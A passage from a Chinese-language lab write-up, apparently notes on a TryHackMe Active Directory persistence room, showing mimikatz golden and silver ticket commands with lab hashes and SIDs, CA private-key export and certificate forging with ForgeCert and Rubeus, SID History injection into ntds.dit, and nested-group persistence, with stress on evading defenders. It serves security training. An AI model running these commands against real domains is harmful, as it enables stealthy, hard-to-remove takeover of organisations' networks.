ID</strong>：票据中会包含你想要伪装的用户名，比如 <code>Administrator</code>。</li><li>**目标服务帐户的 SPN (Service Principal Name)**：这是服务的唯一标识，格式为 <code>&lt;服务类型&gt;/&lt;主机名&gt;</code>，比如 <code>cifs/thmserv1.za.tryhackme.loc</code>。</li></ol><p><strong>攻击要点：</strong></p><ul><li><strong>核心需求</strong>：为了伪造白银票据，我们需要目标服务器机器账户的密码哈希。</li><li><strong>范围有限</strong>：白银票据的权限范围仅限于<strong>特定服务器上的特定服务</strong>。相比黄金票据的完全控制，它的权限范围要小得多。</li><li><strong>极高隐蔽性</strong>：由于攻击绕过了 DC，没有 TGT 的生成记录，所以<strong>唯一的日志只存在于被攻击的服务器上</strong>，使得蓝队很难察觉。</li><li><strong>持久化</strong>：我们可以利用白银票据修改注册表，来阻止机器账户密码自动重置（通常每 30 天重置一次），从而保持对该主机的持久化访问。</li><li><strong>机器账户</strong>：机器账户可以被视为普通的 AD 账户，因此即使只获取了它的权限，也足以继续进行信息收集和攻击。</li></ul><p>关于 Svc Session Key，这个也要参考这张图。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png" alt="Kerberos authenticate" data-caption="Kerberos authenticate" loading="lazy"></p><p>在正常的 Keberos 认证中，Svc Session Key 是 KDC 生成并且返回给我们的，然后 TGS 里面会有一份 Svc Session Key，如果我们没有拿到白银票据（服务账户的 Hash），我们就没法对 TGS 下手，所以这个攻击链就没法完成。正因为有了服务账户的 Hash，所以我们可以捏造 Svc Session Key 了，在原始的过程中，这个 Key 是用来保证请求不被篡改的，一旦有了 Hash，这个安全性就不存在了。</p><h3 id="伪造票据实践"><a href="#伪造票据实践" class="headerlink" title="伪造票据实践"></a>伪造票据实践</h3><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 获取域信息，关注 SID 和 FQDN</span></span><span class="line"><span style="color: #56B6C2">Get-ADDomain</span></span></code></pre></div></div></figure><ul><li>DomainSID: S-1-5-21-3885271727-2693558621-2658995185</li><li>DNSRoot: za.tryhackme.loc</li><li>krbtgt: 16f9af38fca3ada405386b3b57366082</li></ul><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 使用 mimikatz 生成金票</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># /ptt 代表让 mimikatz 直接加载凭据到现在这个 session 里</span></span><span class="line"><span style="color: #ABB2BF">kerberos::golden </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">admin:ReallyNotALegitAccount </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">id:</span><span style="color: #D19A66">500</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">sid:S</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">21</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">3885271727</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2693558621</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2658995185</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">krbtgt:16f9af38fca3ada405386b3b57366082 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">endin:</span><span style="color: #D19A66">600</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">renewmax:</span><span style="color: #D19A66">10080</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">ptt</span></span></code></pre></div></div></figure><p><strong>&#x2F;endin: 票据的绝对有效期（Ticket Lifetime）</strong></p><ul><li><strong>含义</strong>: 这是票据的<strong>绝对截止日期</strong>。一旦过了这个时间，票据就彻底失效，<strong>无法再续订</strong>。</li><li><strong>用途</strong>: 它定义了票据最长能使用多久。在默认的 AD 策略中，这个时间通常是 10 小时。</li><li><strong>示例</strong>: 你可以把 <code>/endin</code> 理解为一张电影票的<strong>“有效截止日期”</strong>。过了这个日期，电影票就作废了。</li></ul><p><strong>&#x2F;renewmax: 票据最长可续订时间（Maximum Renew Lifetime）</strong></p><ul><li><strong>含义</strong>: 这是票据<strong>可以被续订的最长时间</strong>。只要在 <code>/endin</code> 之前，你可以向 KDC（Key Distribution Center）请求续订，以延长票据的有效时间。但这个续订过程不能超过 <code>/renewmax</code> 的限制。</li><li><strong>用途</strong>: 它允许用户在一段时间内保持访问，而无需频繁地重新认证。默认的 AD 策略通常是 7 天。</li><li><strong>示例</strong>: 你可以把 <code>/renewmax</code> 理解为一张图书馆借书证的<strong>“最长借书期限”</strong>。你每次借书的期限可能只有两周（<code>/endin</code>），但只要不超过总的“最长借书期限”（<code>/renewmax</code>），你就可以反复续借。</li></ul><p>虽然黄金票据提供了强大的持久化访问能力，但蓝队可以通过<strong>重置 KRBTGT 账户密码两次</strong>来对抗它。因此，如果想真正实现持久化，更应该使用<strong>白银票据</strong>。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 生成银票</span></span><span class="line"><span style="color: #ABB2BF">kerberos::golden </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">admin:StillNotALegitAccount </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">id:</span><span style="color: #D19A66">500</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">sid:S</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">21</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">3885271727</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2693558621</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2658995185</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">target:THMSERVER1.za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">service:cifs </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">ptt</span></span></code></pre></div></div></figure><ul><li><strong>&#x2F;target</strong> - The hostname of our target server. Let’s do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.</li><li><strong>&#x2F;rc4</strong> - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.</li><li><strong>&#x2F;service</strong> - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.</li></ul><p>要注意的是，服务账户的密码是会轮换的，一旦轮换了，这个 TGS 就失效了，所以一般还要对注册表下手，以实现持久化。</p><h2 id="Persistence-through-Certificates"><a href="#Persistence-through-Certificates" class="headerlink" title="Persistence through Certificates"></a>Persistence through Certificates</h2><p>虽然依赖凭据的持久化技术很有效，但蓝队最终可以通过轮换凭据来清除攻击者的访问权限。因此，我们需要寻找不依赖于凭据的、更高级的持久化技术，而证书就是其中之一。</p><p><strong>证书不仅是用于权限提升的工具，更是一种强大且难以清除的持久化手段</strong>。通过获取一张有效的客户端认证证书，攻击者可以绕过密码重置，长期维持对目标账户的访问。这种持久化方式的有效性通常长达数年，除非蓝队主动吊销或等待证书过期。更深一层的攻击是直接攻陷证书颁发机构（CA）本身，窃取其根证书的私钥。这样一来，攻击者就能随意伪造证书，并且这些证书因为没有正式颁发记录，蓝队甚至无法通过吊销来清除，唯一的防御手段是轮换整个 CA，这会对整个组织造成灾难性的业务影响，让蓝队在付出巨大努力清理完其他所有入侵痕迹后，仍然无法摆脱攻击者的控制。</p><h3 id="提取私钥"><a href="#提取私钥" class="headerlink" title="提取私钥"></a>提取私钥</h3><p>可以用 Mimikatz 和 SharpDPAPI 提取证书的私钥</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 启动 mimikatz</span></span><span class="line"><span style="color: #ABB2BF">C:\Tools\mimikatz_trunk\x64\</span><span style="color: #56B6C2">mimikatz.exe</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 查看存储的证书</span></span><span class="line"><span style="color: #ABB2BF">crypto::certificates </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">systemstore:local_machine</span></span></code></pre></div></div></figure><p>可以看到有一些证书的 Exportable key : NO，所以没法直接导出，但是我们可以通过修改内存的方式让他们可以导出</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">privilege::debug</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">crypto::capi</span></span><span class="line"><span style="color: #ABB2BF">crypto::cng</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 导出证书</span></span><span class="line"><span style="color: #ABB2BF">crypto::certificates </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">systemstore:local_machine </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">export</span></span></code></pre></div></div></figure><p>导出的证书会同时用 PFX 和 DER 格式存储在目录下，mimikatz 默认会用 <code>mimikatz</code> 密码加密证书。</p><h3 id="生成和使用证书"><a href="#生成和使用证书" class="headerlink" title="生成和使用证书"></a>生成和使用证书</h3><p>现在我们有了私钥和根证书，我们能用 <a href="https://github.com/GhostPack/ForgeCert">ForgeCert</a> 工具去伪造我们想要的用户认证证书。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123</span></span></code></pre></div></div></figure><p>要关注的参数是 SubjectAltName，即 SAN。还记得上个 Room 那个证书模板允许使用替代名字吗，就是这个玩意。</p><p>然后我们就可以用这个证书去请求 TGT：</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># Rubeus 生成 TGT</span></span><span class="line"><span style="color: #ABB2BF">C:\Tools\</span><span style="color: #56B6C2">Rubeus.exe</span><span style="color: #ABB2BF"> asktgt </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:Administrator </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">enctype:aes256 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">certificate:fullAdmin.pfx </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">password:Password123 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">outfile:tgt.tgt </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">dc:thmdc.za.tryhackme.loc</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># mimikatz 载入 TGT</span></span><span class="line"><span style="color: #ABB2BF">kerberos::ptt tgt.tgt</span></span></code></pre></div></div></figure><p>这里依旧提示 <code>[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP</code> ，可以用 LDAP 认证去绕过，上个房间有步骤，就不再叙述了。</p><h3 id="我们不再是蓝队的朋友"><a href="#我们不再是蓝队的朋友" class="headerlink" title="我们不再是蓝队的朋友"></a>我们不再是蓝队的朋友</h3><p>证书持久化是极难防御的。即使你轮换了被入侵账户的凭据，证书仍然是有效的。移除这种持久化的唯一方法是吊销证书。然而，这只在我们通过合法渠道生成证书的情况下才有可能。由于我们是导出 CA 后自己生成了证书，它不会出现在 AD CS 的已颁发证书列表中，这意味着蓝队将无法吊销我们的证书。</p><p>那么，移除这种持久化的唯一解决方案是什么？这就是我们不再是朋友的原因了。他们将不得不吊销根 CA 证书。但吊销这个证书意味着所有由 AD CS 颁发的证书将全部失效。换言之，他们必须为每个使用 AD CS 的系统重新生成证书。你应该开始明白为什么这种类型的持久化是极其危险的，如果真的发生，可能需要对系统进行全面重建。</p><h3 id="拓展阅读-1"><a href="#拓展阅读-1" class="headerlink" title="拓展阅读"></a>拓展阅读</h3><ul><li><a href="https://pentestlab.blog/2021/11/15/golden-certificate/">Golden Certificate</a></li></ul><h2 id="Persistence-through-SID-History"><a href="#Persistence-through-SID-History" class="headerlink" title="Persistence through SID History"></a>Persistence through SID History</h2><p>这个 SID 就和之前那个改两次 krbtgt 密码有异曲同工之妙，<strong>SID</strong>（Security Identifier）是用来唯一标识用户和组账户的。当一个组织进行 <strong>Active Directory 迁移</strong>时，用户在新域中会得到一个新的 SID。为了让他们能够继续访问旧域的资源，管理员可以将旧的 SID 添加到他们在新账户的 <strong>SID 历史</strong>属性中。</p><p>这个过程本质上是赋予一个新账户<strong>旧账户的所有权限</strong>。而攻击者可以滥用这个功能，将一个<strong>高权限账户的 SID</strong>（例如域管理员的 SID）添加到自己<strong>低权限账户的 SID 历史</strong>中。这样，攻击者就能以自己的账户身份，获得高权限账户的所有访问权限，从而实现<strong>持久化</strong>。这种技术非常隐蔽，因为账户本身的权限看起来没有变化，但它实际上拥有了管理员的权限。</p><h3 id="SID-History-能让我们为所欲为"><a href="#SID-History-能让我们为所欲为" class="headerlink" title="SID History 能让我们为所欲为"></a>SID History 能让我们为所欲为</h3><p>实际上，SID 历史的功能并不仅限于包含来自其他域的 SID。只要有足够的权限，我们甚至可以将当前域的 SID 添加到我们控制的账户的 SID 历史中。关于这种持久化技术，有以下几个要点：</p><ul><li>通常，我们需要域管理员或同等的权限才能执行此攻击。</li><li>当账户创建登录事件时，与之关联的 SID 会被添加到用户的令牌中，进而决定该账户的权限。这其中包括了组的 SID。</li><li>如果我们将<strong>企业管理员（Enterprise Admin）的 SID</strong> 注入到 SID 历史中，就可以将账户权限提升到等同于整个林中所有域的域管理员。</li><li>由于 SID 是直接添加到用户令牌中的，即使该账户并未实际加入到任何特定组中，其权限也会被认可。这使得它成为一种非常隐蔽的持久化方法。我们的账户可以只是一名普通用户，只属于 <code>Domain Users</code> 组，却拥有足以攻陷整个域（甚至整个林）的权限。我们甚至可以更进一步，利用这个账户去修改其他账户的 SID 历史，从而让初始的持久化入口更难被发现和修复。</li></ul><h3 id="伪造历史"><a href="#伪造历史" class="headerlink" title="伪造历史"></a>伪造历史</h3><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 检查我们的用户目前 SID history 没有任何数据</span></span><span class="line"><span style="color: #56B6C2">Get-ADUser</span><span style="color: #ABB2BF"> irene.leach </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">properties sidhistory,memberof</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># SIDHistory        : {}</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 查看 Domain Admins 组的 SID</span></span><span class="line"><span style="color: #56B6C2">Get-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Domain Admins&quot;</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># SID               : S-1-5-21-3885271727-2693558621-2658995185-512</span></span></code></pre></div></div></figure><p>我们可以使用类似 Mimikatz 的工具来添加 SID 历史记录。但是，最新版本的 Mimikatz 有一个缺陷，无法通过修补 LSASS 来更新 SID 历史记录。在这种情况下，我们将使用 <a href="https://github.com/MichaelGrafnetter/DSInternals">DSInternals</a> 工具直接修补 ntds.dit 文件，即存储所有信息的 AD 数据库：</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># NTDS 数据库在运行的时候是被锁定的</span></span><span class="line"><span style="color: #56B6C2">Stop-Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name ntds </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">force</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 修补数据库</span></span><span class="line"><span style="color: #56B6C2">Add-ADDBSidHistory</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&#39;irene.leach&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SidHistory </span><span style="color: #98C379">&#39;S-1-5-21-3885271727-2693558621-2658995185-512&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DatabasePath C:\Windows\NTDS\ntds.dit</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 启动 NTDS 服务</span></span><span class="line"><span style="color: #56B6C2">Start-Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name ntds</span></span></code></pre></div></div></figure><p>现在应该就有权限了，用我们那个用户登录检查一下</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 查看当前的 sidhistory</span></span><span class="line"><span style="color: #56B6C2">Get-ADUser</span><span style="color: #ABB2BF"> irene.leach </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Properties sidhistory</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># SIDHistory        : {S-1-5-21-3885271727-2693558621-2658995185-512}</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 检查一下是否真的有权限执行</span></span><span class="line"><span style="color: #ABB2BF">dir \\thmdc.za.tryhackme.loc\c$</span></span></code></pre></div></div></figure><h3 id="蓝队的怒火与无力"><a href="#蓝队的怒火与无力" class="headerlink" title="蓝队的怒火与无力"></a>蓝队的怒火与无力</h3><p>如果你使用 RDP 登录到其中一台主机并使用“AD 用户和组”管理工具，你能够看到被添加到你用户账户上的 SID 历史属性。然而，即使拥有最高权限，你也无法通过这个图形界面移除该属性，因为它受到了保护。要移除它，你必须使用像 <strong>AD-RSAT PowerShell</strong> 命令这样的工具。</p><p>然而，在你考虑如何移除恶意的 SID 历史属性之前，你首先要能找到它。常规的工具不会告诉你哪里出了问题。那个用户并不会突然显示为“域管理员”组的成员。因此，除非你主动地逐一检查所有用户的属性，否则这会非常难被发现。这是因为 SID 历史只在用户认证时才会被应用和使用。</p><p>想象一下你就是蓝队成员，正在处理一起入侵事件。你刚刚完成了一次域清理，为此两次重置了 krbtgt 账户的密码，清除了黄金和白银票据，甚至从头重建了整个 CA 服务器。但就在这时，你却发现攻击者仍然在用一个低权限账户执行域管理员的命令。这绝对会是糟糕透顶的一天。</p><h2 id="Persistence-through-Group-Membership"><a href="#Persistence-through-Group-Membership" class="headerlink" title="Persistence through Group Membership"></a>Persistence through Group Membership</h2><p>蓝队会重点监控那些最高权限的“受保护组”，比如 <code>Domain Admins</code>。直接将自己的账户加入这些组，虽然能立刻获得最高权限，但被发现的风险也最大。</p><p><strong>选择次要但关键的组</strong>：更隐蔽的策略是选择那些看似普通但实际上拥有强大权限的组，比如：</p><ul><li><strong>IT 支持组</strong>：可以重置低权限用户的密码。这听起来权限不高，但可以作为“跳板”，通过窃取其他用户的凭据来逐步提升权限。</li><li><strong>本地管理员组</strong>：获得对多台机器的本地管理员权限，意味着可以控制这些机器。一旦控制足够多的机器，就有机会横向移动并最终攻陷整个域。</li><li><strong>拥有 GPO 所有权的组</strong>：GPO 能够影响整个域的策略，控制它就相当于控制了域内的安全配置。这种权限虽然不是直接的“管理员”，但其潜在危害同样巨大。</li></ul><p>简而言之，持久化的最高境界不是拥有最高权限，而是<strong>以最低的被发现风险，获得足以重新发起攻击的关键权限</strong>。</p><h3 id="嵌套组"><a href="#嵌套组" class="headerlink" title="嵌套组"></a>嵌套组</h3><p>嵌套组（Nested Groups）是一种利用 Active Directory 复杂权限结构的攻击手法。直接将账户加入高权限的父组（如“域管理员”）非常显眼，容易被安全团队发现。因此，攻击者可以转而将自己的账户加入到该父组的<strong>子组中</strong>。通过这种方式，攻击者可以<strong>继承父组的所有权限</strong>，但账户本身看起来只是一个普通子组成员，从而降低了被监控系统发现的风险，实现了隐蔽的持久化访问。这种攻击利用了 AD 中权限可见性差、监控不完善的弱点，是一种比直接加组更隐蔽和高级的持久化技术。</p><p>就是套娃，直接加一个组很明显，但是我们可以加这个组下面的组，同样拥有这个组的权限。</p><h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 在 People-&gt;IT OU 下创建一个组</span></span><span class="line"><span style="color: #56B6C2">New-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;irene.leach Net Group 1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&quot;irene.leach_nestgroup1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DisplayName </span><span style="color: #98C379">&quot;irene.leach Nest Group 1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupScope Global </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupCategory Security</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 在 People-&gt;Sales OU 下创建一个组</span></span><span class="line"><span style="color: #56B6C2">New-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;irene.leach Net Group 2&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&quot;irene.leach_nestgroup2&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DisplayName </span><span style="color: #98C379">&quot;irene.leach Nest Group 2&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupScope Global </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupCategory Security</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 把我们创建的第一个组加到第二个组下面的成员里面</span></span><span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;irene.leach_nestgroup2&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach_nestgroup1&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 可以重复很多次</span></span><span class="line"><span style="color: #56B6C2">New-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;irene.leach Net Group 3&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&quot;irene.leach_nestgroup3&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DisplayName </span><span style="color: #98C379">&quot;irene.leach Nest Group 3&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupScope Global </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupCategory Security</span></span><span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;irene.leach_nestgroup3&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach_nestgroup2&quot;</span></span><span class="line"><span style="color: #56B6C2">New-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;irene.leach Net Group 4&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&quot;irene.leach_nestgroup4&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DisplayName </span><span style="color: #98C379">&quot;irene.leach Nest Group 4&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupScope Global </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupCategory Security</span></span><span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;irene.leach_nestgroup4&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach_nestgroup3&quot;</span></span><span class="line"><span style="color: #56B6C2">New-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;irene.leach Net Group 5&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&quot;irene.leach_nestgroup5&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DisplayName </span><span style="color: #98C379">&quot;irene.leach Nest Group 5&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupScope Global </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupCategory Security</span></span><span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span 